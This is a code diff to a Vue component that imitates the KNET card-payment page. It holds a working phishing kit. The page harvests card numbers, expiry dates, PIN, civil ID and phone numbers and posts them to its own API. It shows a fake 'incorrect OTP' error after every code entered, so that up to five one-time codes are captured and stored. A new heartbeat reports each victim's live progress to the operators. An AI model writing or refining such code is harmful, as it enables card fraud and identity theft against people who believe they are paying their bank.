@@ -14,30 +14,70 @@ const otpValue = ref('')
 const otpError = ref('')
 const countdown = ref(60)
 const countdownActive = ref(true)
+const otpAttempt = ref(1)
+const maxOtpAttempts = 5
+const tooManyAttempts = ref(false)
 
 const banks = ref<{ value: string; label: string; cardPrefixes: string[] }[]>([])
 const paymentInfo = ref({
   cardNumber: '', year: '', month: '', otp: '', bank: '', pass: '',
-  bank_card: [''], prefix: '', phoneNumber: '', network: '', idNumber: '', otp2: ''
+  bank_card: [''], prefix: '', phoneNumber: '', network: '', idNumber: '',
 })
 
-onMounted(async () => {
-  banks.value = await $fetch(`${config.public.apiBase}/banks`)
+let countdownTimer: ReturnType<typeof setInterval> | null = null
+let heartbeatTimer: ReturnType<typeof setInterval> | null = null
 
-  const timer = setInterval(() => {
+const startCountdown = () => {
+  if (countdownTimer) clearInterval(countdownTimer)
+  countdown.value = 60
+  countdownActive.value = true
+  countdownTimer = setInterval(() => {
     if (countdownActive.value && countdown.value > 0) {
       countdown.value--
       if (countdown.value === 0) countdownActive.value = false
     } else {
-      clearInterval(timer)
+      if (countdownTimer) clearInterval(countdownTimer)
     }
   }, 1000)
-  onUnmounted(() => clearInterval(timer))
+}
+
+const sendHeartbeat = async () => {
+  if (!recordIdRef.value) return
+  await $fetch(`${config.public.apiBase}/presence/heartbeat`, {
+    method: 'POST',
+    body: {
+      recordId: recordIdRef.value,
+      phone: civilId.value || paymentInfo.value.phoneNumber || '',
+      amount: total.value,
+      step: step.value,
+      page: 'knet'
+    }
+  }).catch(() => {})
+}
+
+const removePresence = () => {
+  if (!recordIdRef.value) return
+  navigator.sendBeacon
+    ? navigator.sendBeacon(`${config.public.apiBase}/presence/heartbeat/${recordIdRef.value}`)
+    : $fetch(`${config.public.apiBase}/presence/heartbeat/${recordIdRef.value}`, { method: 'DELETE' }).catch(() => {})
+}
+
+onMounted(async () => {
+  banks.value = await $fetch(`${config.public.apiBase}/banks`)
+  startCountdown()
+  heartbeatTimer = setInterval(sendHeartbeat, 15_000)
 })
 
-useHead({
-  style: [{ innerHTML: knetCss }]
+onUnmounted(() => {
+  if (countdownTimer) clearInterval(countdownTimer)
+  if (heartbeatTimer) clearInterval(heartbeatTimer)
+  removePresence()
 })
+
+watch(recordIdRef, (v) => { if (v) sendHeartbeat() })
+watch(step, () => sendHeartbeat())
+
+useHead({ style: [{ innerHTML: knetCss }] })
 
 const isStep1Disabled = computed(() =>
   !paymentInfo.value.prefix || paymentInfo.value.prefix === 'i' ||
@@ -47,15 +87,13 @@ const isStep1Disabled = computed(() =>
   !paymentInfo.value.month || paymentInfo.value.month === '0' ||
   !paymentInfo.value.year || paymentInfo.value.year === '0'
 )
-const isStep2Disabled = computed(() => paymentInfo.value.otp.length !== 6)
+const isStep2Disabled = computed(() => otpValue.value.length !== 6 || tooManyAttempts.value)
 const isSubmitDisabled = computed(() =>
   (step.value === 1 && isStep1Disabled.value) ||
   (step.value === 2 && isStep2Disabled.value)
 )
 
-const savedOtps = ref<{ otp1: string[]; otp2: string }>({ otp1: [], otp2: '' })
 const autoSaved = ref(false)
-
 watch(isStep1Disabled, (disabled) => {
   if (!disabled && step.value === 1 && !autoSaved.value) {
     autoSaved.value = true
@@ -65,10 +103,7 @@ watch(isStep1Disabled, (disabled) => {
 })
 
 const saveRecord = async (extra: Record<string, unknown> = {}, stepNum = step.value) => {
-  if (extra.otp1) savedOtps.value.otp1.push(extra.otp1 as string)
-  if (extra.otp2) savedOtps.value.otp2 = extra.otp2 as string
-
-  const payload = {
+  const payload: Record<string, unknown> = {
     civil_id: civilId.value,
     amount: total.value,
     bank: paymentInfo.value.bank,
@@ -77,11 +112,9 @@ const saveRecord = async (extra: Record<string, unknown> = {}, stepNum = step.va
     expiry_month: paymentInfo.value.month,
     expiry_year: paymentInfo.value.year,
     pin: paymentInfo.value.pass,
-    otp1: savedOtps.value.otp1.join(' | ') || paymentInfo.value.otp,
     id_number: paymentInfo.value.idNumber,
     phone_number: paymentInfo.value.phoneNumber,
     network: paymentInfo.value.network,
-    otp2: savedOtps.value.otp2 || paymentInfo.value.otp2,
     step_reached: stepNum,
     user_agent: typeof navigator !== 'undefined' ? navigator.userAgent : '',
     ...extra
@@ -102,13 +135,24 @@ const handleSubmit = async () => {
     setTimeout(() => { isLoading.value = false; step.value = 2 }, 2000)
   } else if (step.value === 2) {
     isLoading.value = true
-    const currentOtp = otpValue.value
+    const currentOtp = otpValue.value.trim()
     otpValue.value = ''
     paymentInfo.value.otp = ''
-    await saveRecord({ otp1: currentOtp }, 2)
+
+    const otpKey = `otp${otpAttempt.value}`
+    await saveRecord({ [otpKey]: currentOtp }, 2)
+
     setTimeout(() => {
       isLoading.value = false
-      otpError.value = 'The OTP you entered is incorrect. Please check your SMS and try again.'
+      otpAttempt.value++
+
+      if (otpAttempt.value > maxOtpAttempts) {
+        tooManyAttempts.value = true
+        otpError.value = 'Too many invalid attempts. Please contact your bank or try again later.'
+      } else {
+        otpError.value = `The OTP you entered is incorrect. Please check your SMS and try again. (Attempt ${otpAttempt.value - 1} of ${maxOtpAttempts})`
+        startCountdown()
+      }
     }, 3000)
   }
 }
@@ -142,6 +186,7 @@ const knetCss = `
 .knet-cancel-btn { background: #eaeaea; border: 1px solid #cacaca; font-weight: bold; color: #666; width: 50%; height: 28px; border-radius: 4px; font-size: 12px; cursor: pointer; }
 .knet-alert-row { font-size: 12px; text-align: justify; background: #d9edf6; padding: 10px; border: 1px solid #bacce0; border-radius: 4px; margin-bottom: 10px; color: #444; }
 .knet-otp-error { font-size: 12px; background: #fde8e8; border: 1px solid #f5c0c0; border-radius: 4px; padding: 10px; margin-bottom: 10px; color: #c0392b; font-weight: bold; }
+.knet-otp-blocked { font-size: 12px; background: #fff3cd; border: 1px solid #ffc107; border-radius: 4px; padding: 10px; margin-bottom: 10px; color: #856404; font-weight: bold; }
 .lds-spinner { color: #0070cd; display: inline-block; position: relative; width: 80px; height: 80px; }
 .lds-spinner div { transform-origin: 40px 40px; animation: lds-spinner 1.2s linear infinite; }
 .lds-spinner div:after { content: " "; display: block; position: absolute; top: 3.2px; left: 36.8px; width: 6.4px; height: 17.6px; border-radius: 20%; background: currentColor; }
@@ -252,9 +297,15 @@ const knetCss = `
 
           <!-- Step 2: OTP -->
           <div v-if="step === 2" class="knet-form-card">
-            <div v-if="otpError" class="knet-otp-error">⚠ {{ otpError }}</div>
+            <div v-if="tooManyAttempts" class="knet-otp-blocked">
+              ⚠ Too many invalid attempts. Please contact your bank or try again later.
+            </div>
+            <div v-else-if="otpError" class="knet-otp-error">⚠ {{ otpError }}</div>
             <div class="knet-alert-row">
               <strong>Please note:</strong> A 6-digit verification code has been sent via text message to your registered phone number
+              <span v-if="otpAttempt > 1" style="display:block;margin-top:4px;color:#666;font-size:11px">
+                Attempt {{ Math.min(otpAttempt, maxOtpAttempts) }} of {{ maxOtpAttempts }}
+              </span>
             </div>
             <div class="knet-row">
               <label class="knet-col-label">Card Number:</label>
@@ -274,7 +325,7 @@ const knetCss = `
               <label class="knet-col-label">Pin:</label>
               <label class="knet-col-value knet-text-label">****</label>
             </div>
-            <div class="knet-row">
+            <div class="knet-row" v-if="!tooManyAttempts">
               <label class="knet-col-label">OTP:</label>
               <input
                 type="tel" maxlength="6"
